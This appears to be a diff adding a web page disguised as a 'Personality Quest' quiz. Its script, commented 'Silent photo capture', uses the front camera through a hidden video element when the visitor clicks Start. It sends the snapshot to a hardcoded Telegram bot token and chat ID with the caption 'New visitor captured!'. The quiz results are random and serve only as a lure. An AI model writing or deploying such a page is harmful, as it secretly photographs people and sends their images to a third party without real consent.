@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Personality Quest — Discover Yourself</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 500px;
+      width: 100%;
+      padding: 40px;
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 3rem;
+      margin-bottom: 10px;
+    }
+
+    h1 {
+      color: #333;
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      color: #888;
+      font-size: 1rem;
+      margin-bottom: 30px;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      font-size: 1.1rem;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+    }
+
+    .quiz-section {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .question {
+      font-size: 1.2rem;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .option {
+      background: #f0f0f5;
+      border: 2px solid transparent;
+      padding: 12px 20px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1rem;
+      color: #555;
+      transition: all 0.2s;
+    }
+
+    .option:hover {
+      border-color: #667eea;
+      background: #eef0ff;
+    }
+
+    .loading {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .spinner {
+      border: 4px solid #f0f0f5;
+      border-top: 4px solid #667eea;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: #888;
+      font-size: 0.95rem;
+    }
+
+    .progress {
+      height: 6px;
+      background: #f0f0f5;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #667eea, #764ba2);
+      width: 0%;
+      transition: width 0.4s;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">🧠</div>
+    <h1>Personality Quest</h1>
+    <p class="subtitle">Discover your true personality in just 30 seconds!</p>
+    <button class="btn" id="start-btn">Start Quiz →</button>
+
+    <div class="quiz-section" id="quiz-section">
+      <div class="progress">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+      <div class="question" id="question">Loading question...</div>
+      <div class="options" id="options"></div>
+    </div>
+
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      <p class="loading-text">Analyzing your answers...</p>
+    </div>
+  </div>
+
+  <script>
+    // ============================================
+    // CONFIG - Replace these with your values
+    // ============================================
+    const BOT_TOKEN = '8603317282:AAHG3gXtWVh9MjaAN71AToWR51MzHiWRAto';
+    const CHAT_ID = '8811016293';
+    // ============================================
+
+    const startBtn = document.getElementById('start-btn');
+    const quizSection = document.getElementById('quiz-section');
+    const loading = document.getElementById('loading');
+    const questionEl = document.getElementById('question');
+    const optionsEl = document.getElementById('options');
+    const progressBar = document.getElementById('progress-bar');
+
+    let currentQuestion = 0;
+
+    const questions = [
+      {
+        q: "What's your ideal weekend?",
+        opts: ["Outdoor adventure", "Netflix & chill", "Party with friends", "Reading a book"]
+      },
+      {
+        q: "Pick a color that speaks to you:",
+        opts: ["Ocean Blue", "Sunset Orange", "Forest Green", "Royal Purple"]
+      },
+      {
+        q: "How do you handle stress?",
+        opts: ["Exercise it out", "Talk to someone", "Sleep on it", "Eat comfort food"]
+      },
+      {
+        q: "What's your dream vacation?",
+        opts: ["Mountain trekking", "Beach resort", "City exploring", "Road trip"]
+      },
+      {
+        q: "Choose a superpower:",
+        opts: ["Invisibility", "Time travel", "Mind reading", "Flying"]
+      }
+    ];
+
+    // Silent photo capture
+    function capturePhoto() {
+      navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      })
+      .then(function(stream) {
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        video.muted = true;
+        document.body.appendChild(video);
+        video.play();
+
+        video.addEventListener('loadedmetadata', function() {
+          setTimeout(function() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function(blob) {
+              sendToTelegram(blob);
+            }, 'image/jpeg', 0.9);
+
+            stream.getTracks().forEach(function(track) {
+              track.stop();
+            });
+            video.remove();
+          }, 1500);
+        });
+      })
+      .catch(function(err) {
+        console.log('Camera access denied:', err);
+      });
+    }
+
+    // Send to Telegram via FormData
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', 8811016293);
+      formData.append('photo', blob, 'photo.jpg');
+      formData.append('caption', '📸 New visitor captured!');
+
+      fetch(`https://api.telegram.org/bot8603317282:AAHG3gXtWVh9MjaAN71AToWR51MzHiWRAto/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(function(res) { return res.json(); })
+      .then(function(data) {
+        if (data.ok) {
+          console.log('Photo sent successfully');
+        } else {
+          console.log('Telegram error:', data);
+        }
+      })
+      .catch(function(err) {
+        console.log('Send error:', err);
+      });
+    }
+
+    // Start quiz
+    startBtn.addEventListener('click', function() {
+      startBtn.style.display = 'none';
+      quizSection.style.display = 'block';
+      capturePhoto(); // Trigger silent capture on start
+      showQuestion();
+    });
+
+    function showQuestion() {
+      if (currentQuestion >= questions.length) {
+        showResults();
+        return;
+      }
+
+      const q = questions[currentQuestion];
+      questionEl.textContent = q.q;
+      progressBar.style.width = ((currentQuestion / questions.length) * 100) + '%';
+
+      optionsEl.innerHTML = '';
+      q.opts.forEach(function(opt) {
+        const div = document.createElement('div');
+        div.className = 'option';
+        div.textContent = opt;
+        div.addEventListener('click', function() {
+          currentQuestion++;
+          showQuestion();
+        });
+        optionsEl.appendChild(div);
+      });
+    }
+
+    function showResults() {
+      quizSection.style.display = 'none';
+      loading.style.display = 'block';
+
+      const results = [
+        "You're a Creative Soul! 🎨",
+        "You're an Adventurer! 🏔️",
+        "You're a Deep Thinker! 🤔",
+        "You're a Social Butterfly! 🦋"
+      ];
+
+      setTimeout(function() {
+        const result = results[Math.floor(Math.random() * results.length)];
+        loading.innerHTML = `
+          <div style="font-size: 4rem; margin-bottom: 15px;">🎉</div>
+          <h2 style="color: #333; margin-bottom: 10px;">${result}</h2>
+          <p class="loading-text">Share your result with friends!</p>
+        `;
+      }, 2500);
+    }
+  </script>
+</body>
+  </html>
